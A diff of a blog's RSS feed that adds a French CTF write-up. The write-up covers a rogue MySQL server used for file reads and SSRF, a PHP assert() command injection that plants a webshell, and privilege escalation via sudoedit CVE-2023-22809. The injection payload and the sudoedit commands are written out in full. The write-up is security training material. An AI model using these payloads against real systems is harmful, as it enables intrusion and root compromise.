@@ -6,8 +6,110 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 25 Dec 2022 02:09:19 +0100</lastBuildDate>
+        <lastBuildDate>Tue, 31 Jan 2023 04:17:18 +0100</lastBuildDate>
         <atom:link href="https://SpawnZii.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>[ESNA x Worty] Web - Worty is my cheat sheet</title>
+            <link>https://SpawnZii.github.io/posts/2023/01/esna-x-worty-web-worty-is-my-cheat-sheet/</link>
+            <pubDate>Tue, 31 Jan 2023 04:17:18 +0100</pubDate>
+            
+            <guid>https://SpawnZii.github.io/posts/2023/01/esna-x-worty-web-worty-is-my-cheat-sheet/</guid>
+            <description>Introduction Après la seconde place de l&amp;rsquo;ESNA au CTF Hack The Box University, nous nous sommes retrouvés avec plusieurs vouchers VIP inutilisé. Pour ne pas faire de gaspillage, Worty et Raccon ont monté un petit ctf afin de faire gagner les vouchers.
+How to easily bypass htaccess. Pour cette première step on tombe sur une basic auth nous bloquant l&amp;rsquo;accès au site web. Après avoir essayé de bypass la basic auth pendant 1h j&amp;rsquo;ai checké le discord :</description>
+            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Après la seconde place de l&rsquo;ESNA au CTF Hack The Box University, nous nous sommes retrouvés avec plusieurs vouchers VIP inutilisé.
+Pour ne pas faire de gaspillage, Worty et Raccon ont monté un petit ctf afin de faire gagner les vouchers.</p>
+<h2 id="how-to-easily-bypass-htaccess">How to easily bypass htaccess.</h2>
+<p>Pour cette première step on tombe sur une basic auth nous bloquant l&rsquo;accès au site web.
+Après avoir essayé de bypass la basic auth pendant 1h j&rsquo;ai checké le discord :</p>
+<p><img src="/posts/rogue/did.png" alt="form"></p>
+<p><img src="/posts/rogue/cry.jpg" alt="form"></p>
+<pre><code class="language-=bash" data-lang="=bash">cat password_backup.txt
+n = 27182620552013654529650369568565705748677788664051703513266337395733238092531875376829346079159553531457123241552276212754048764762797635636985153141836562181263670659187096790058296112802535209634384851308744617230046727673239246756952826924232293376061107683919851426832540778439598408277510744310544732957459849844992842925811561197892006975135616481557711186576487207986548862391841601897342637702244917677869425808610174878481560432102717330434682738133015928492136262931246958165047025992311590503274784010397877173897171306539670238221654690881938532539968726632926578906780554731266335133846058696129892487373
+c = 22191733097656334441268894550966894763003962701992806393075496528993952967174413647251750076754977373902498755399169194303850560509655763776682540871791477225627505896256751452512106584484111970129639411732978383350049327064540545061771400998692603383267325046814250034587633909699306942830032698775809959654194391837301127502864751635257273516727765369322388708880846946172958917138105995807073004261089626890874309034746318223146659787721194274327239382018007819161170277785075758050241154877512783308279500090525969540211725582763797061251883840441293887160665599549949044245489628854997218046199341708747648984665
+e = 64
+</code></pre><p>Comme j&rsquo;ai un gros niveau en crypto j&rsquo;ai direct sorti mon meilleur tool :</p>
+<p><img src="/posts/rogue/bypass.png" alt="form"></p>
+<p>(<strong>Attention, cette cascade a été réalisée par un professionnel, n&rsquo;essayez surtout pas de la reproduire en CTF</strong>).</p>
+<h2 id="arbitrary-file-read-via-rogue-sql">Arbitrary file read via rogue SQL.</h2>
+<p>Après avoir &ldquo;trouvé&rdquo; les creds on tombe directement sur un panel de configuration d&rsquo;une base de données.</p>
+<p><img src="/posts/rogue/db.png" alt="form"></p>
+<p>On comprend donc qu&rsquo;il faut exploiter une rogue SQL :).
+J&rsquo;ai utilisé un <a href="https://github.com/jib1337/Rogue-MySQL-Server">tool sur github</a>.</p>
+<p>Petit test pour récupérer <code>/etc/passwd</code>.</p>
+<p><img src="/posts/rogue/req.png" alt="form"></p>
+<p><img src="/posts/rogue/passwd.png" alt="form"></p>
+<p>J&rsquo;ai ensuite leak le source code de l&rsquo;app.</p>
+<p><img src="/posts/rogue/index.png" alt="form"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span>
+   <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]))
+{
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">filter_var</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>], <span style="color:#a6e22e">FILTER_VALIDATE_IP</span>))
+    {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">50</span>)
+        {
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">50</span>)
+            {
+                <span style="color:#66d9ef">try</span>
+                {
+                    $mysql <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>], $_POST[<span style="color:#e6db74">&#34;username&#34;</span>], $_POST[<span style="color:#e6db74">&#34;password&#34;</span>]);
+                    <span style="color:#a6e22e">mysqli_options</span>($mysql, <span style="color:#a6e22e">MYSQLI_OPT_LOCAL_INFILE</span>, <span style="color:#66d9ef">true</span>);
+                    $mysql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT version()&#34;</span>);
+                    $msgOk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Database setup completed!&#34;</span>;
+                }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">Exception</span> $e)
+                {
+                    $msgError <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;An unexcepted error happened.&#34;</span>;
+                }
+            }<span style="color:#66d9ef">else</span> $msgError <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Password too long.&#34;</span>;
+        }<span style="color:#66d9ef">else</span> $msgError <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Username too long.&#34;</span>;
+    }<span style="color:#66d9ef">else</span> $msgError <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Invalid IP.&#34;</span>;
+}
+<span style="color:#66d9ef">else</span>
+{
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;table&#39;</span>]))
+    {
+        $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">filter_var</span>($_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>], <span style="color:#a6e22e">FILTER_VALIDATE_IP</span>, <span style="color:#a6e22e">FILTER_FLAG_IPV4</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">FILTER_FLAG_NO_PRIV_RANGE</span> <span style="color:#f92672">|</span>  <span style="color:#a6e22e">FILTER_FLAG_NO_RES_RANGE</span>);
+        <span style="color:#66d9ef">if</span>($res <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
+        {
+            $table <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;table&#39;</span>];
+            <span style="color:#a6e22e">assert</span>(<span style="color:#e6db74">&#34;preg_match(&#39;/^[\w-]+$/&#39;,&#39;</span><span style="color:#e6db74">$table</span><span style="color:#e6db74">) === 1&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Only alphanumeric caracter are accepted to avoid sql injection.&#39;</span>);
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($_GET[<span style="color:#e6db74">&#34;table&#34;</span>],[<span style="color:#e6db74">&#34;users&#34;</span>,<span style="color:#e6db74">&#34;articles&#34;</span>])) <span style="color:#75715e">//todo : replace this with a real connection to the database
+</span><span style="color:#75715e"></span>            {
+                $msgOk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Yes, &#34;</span><span style="color:#f92672">.</span>$_GET[<span style="color:#e6db74">&#34;table&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; is valid&#34;</span>;
+            }
+            <span style="color:#66d9ef">else</span>
+            {
+                $msgError <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;No.&#34;</span>;
+            }
+        }
+    }
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>Après un check rapide on remarque directement le assert, grâce à la version de php (<code>X-Powered-By: PHP/5.6.40</code>) on comprend que assert est vulnérable à une injection de commande.</p>
+<p>Cependant il reste un filtre à bypass.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$res = filter_var($_SERVER[&#34;REMOTE_ADDR&#34;], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE |  FILTER_FLAG_NO_RES_RANGE);
+if($res === false)
+{
+  ...
+}
+</code></pre></div><p>Il est possible d&rsquo;utiliser des wrappers php (php://,file:// &hellip;)dans notre rogue SQL, on peut donc utiliser <strong>http://</strong> pour faire une SSRF.</p>
+<p>Exemple : <code>python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users</code>
+Maintenant J&rsquo;ai j&rsquo;upload mon webshell dans <strong>/var/www/html/</strong>.</p>
+<pre><code class="language-=bash" data-lang="=bash">python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users')===system('echo%20\'&lt;?=\`\$_GET[0]\`;?&gt;\'&gt;/var/www/html/spz.php')||intval('1'&quot;
+</code></pre><p><img src="/posts/rogue/pld.png" alt="form"></p>
+<p>On peut appeler notre webshell.</p>
+<p><img src="/posts/rogue/id.png" alt="form"></p>
+<h2 id="privesc">Privesc</h2>
+<p>Notre utilisateur à des droits sudo :), en version 1.8.19p1.</p>
+<p><img src="/posts/rogue/sudo.png" alt="form"></p>
+<p>On va exploiter la <a href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">CVE-2023-22809</a>.</p>
+<pre><code class="language-=bash" data-lang="=bash">export EDITOR=&quot;nano -- /root/flag.txt&quot; 
+sudo /usr/bin/sudoedit /etc/hosts
+</code></pre><p><img src="/posts/rogue/flag.png" alt="form"></p>
+]]></content>
+        </item>
         
         <item>
             <title>[Avent ESNA] Web - 777 Cyber casino</title>
